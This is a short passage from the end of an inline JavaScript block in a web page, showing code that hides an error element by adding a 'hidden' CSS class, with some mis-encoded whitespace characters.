Â  Â  Â  Â  errorElement.classList.add('hidden');

Â  Â  }

}



</script>
